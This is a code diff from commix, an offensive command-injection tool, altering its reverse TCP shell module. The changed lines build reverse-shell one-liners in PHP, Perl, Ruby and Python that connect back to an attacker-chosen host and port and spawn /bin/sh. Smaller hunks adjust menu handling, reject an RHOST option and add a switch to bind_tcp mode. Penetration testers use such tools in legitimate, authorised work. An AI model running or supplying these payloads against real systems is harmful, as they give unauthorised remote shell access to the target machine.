@@ -209,37 +209,37 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
     # PHP-reverse-shell
     if other_shell == '1':
       other_shell = "php -r '$sock=fsockopen(\"" + settings.LHOST + "\"," + settings.LPORT + ");" \
-                "exec(\"/bin/sh -i <%263 >%263 2>%263\");'"
+                    "exec(\"/bin/sh -i <%263 >%263 2>%263\");'"
       break
 
     # Perl-reverse-shell
     elif other_shell == '2':
       other_shell = "perl -e 'use Socket;" \
-                "$i=\"" + settings.LHOST  + "\";" \
-                "$p=" + settings.LPORT  + ";" \
-                "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" \
-                "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\");" \
-                "open(STDOUT,\">%26S\");open(STDERR,\">%26S\");" \
-                "exec(\"/bin/sh -i\");};'"
+                    "$i=\"" + settings.LHOST  + "\";" \
+                    "$p=" + settings.LPORT  + ";" \
+                    "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" \
+                    "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\");" \
+                    "open(STDOUT,\">%26S\");open(STDERR,\">%26S\");" \
+                    "exec(\"/bin/sh -i\");};'"
       break
 
     # Ruby-reverse-shell
     elif other_shell == '3':
       other_shell = "ruby -rsocket -e 'exit if fork;" \
-                "c=TCPSocket.new(\"" + settings.LHOST  + "\"," + settings.LPORT  + ");" \
-                "while(cmd=c.gets);" \
-                "IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+                    "c=TCPSocket.new(\"" + settings.LHOST  + "\"," + settings.LPORT  + ");" \
+                    "while(cmd=c.gets);" \
+                    "IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
       break
 
     # Python-reverse-shell 
     elif other_shell == '4':
       other_shell = "python -c 'import socket,subprocess,os%0d" \
-                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0d" \
-                "s.connect((\"" + settings.LHOST  + "\"," + settings.LPORT + "))%0d" \
-                "os.dup2(s.fileno(),0)%0d" \
-                "os.dup2(s.fileno(),1)%0d" \
-                "os.dup2(s.fileno(),2)%0d" \
-                "p=subprocess.call([\"/bin/sh\",\"-i\"])%0d'"
+                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0d" \
+                    "s.connect((\"" + settings.LHOST  + "\"," + settings.LPORT + "))%0d" \
+                    "os.dup2(s.fileno(),0)%0d" \
+                    "os.dup2(s.fileno(),1)%0d" \
+                    "os.dup2(s.fileno(),2)%0d" \
+                    "p=subprocess.call([\"/bin/sh\",\"-i\"])%0d'"
       break
 
     # PHP-reverse-shell (meterpreter)
@@ -496,30 +496,30 @@ def reverse_tcp_options():
   while True:
     reverse_tcp_option = raw_input("""   
   ---[ """ + Style.BRIGHT + Fore.BLUE + """Reverse TCP shells""" + Style.RESET_ALL + """ ]---     
-  Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a Netcat reverse TCP shell.
+  Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a netcat reverse TCP shell.
   Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other reverse TCP shells.
 
 commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """)
     # Option 1 - Netcat shell
     if reverse_tcp_option == '1' :
       reverse_tcp_option = netcat_version()
-      if reverse_tcp_option.lower() != "back":
+      if reverse_tcp_option.lower() not in settings.SHELL_OPTIONS:
         shell_success()
         break
+      elif reverse_tcp_option.lower() in settings.SHELL_OPTIONS:
+        return reverse_tcp_option
       else:
         pass  
     # Option 2 - Other (Netcat-Without-Netcat) shells
     elif reverse_tcp_option == '2' :
       reverse_tcp_option = other_reverse_shells()
-      if reverse_tcp_option.lower() != "back":
+      if reverse_tcp_option.lower() not in settings.SHELL_OPTIONS:
         shell_success()
         break
+      elif reverse_tcp_option.lower() in settings.SHELL_OPTIONS:
+        return reverse_tcp_option
       else:
         pass 
-    elif reverse_tcp_option.lower() == "reverse_tcp": 
-      warn_msg = "You are already into the '" + reverse_tcp_option.lower() + "' mode."
-      print settings.print_warning_msg(warn_msg)
-      continue
     elif reverse_tcp_option.lower() == "?": 
       menu.os_shell_options()
       continue
@@ -563,7 +563,12 @@ def configure_reverse_tcp():
             else:
               break
           else:
-            continue  
+            continue
+        if option[4:9].lower() == "rhost":
+          err_msg =  "The '" + option[4:9].upper() + "' option, is not "
+          err_msg += "usable for 'reverse_tcp' mode. Use 'LHOST' option."
+          print settings.print_error_msg(err_msg)  
+          continue  
         if option[4:9].lower() == "lport":
           if check_lport(option[10:]):
             if len(settings.LHOST) == 0:
@@ -574,6 +579,10 @@ def configure_reverse_tcp():
             continue
     elif option.lower() == "os_shell" or option.lower() == "back": 
       settings.REVERSE_TCP = False   
+      break 
+    elif option.lower() == "bind_tcp":
+      settings.BIND_TCP = True
+      settings.REVERSE_TCP = False
       break 
     else:
       err_msg = "The '" + option + "' option, is not valid."
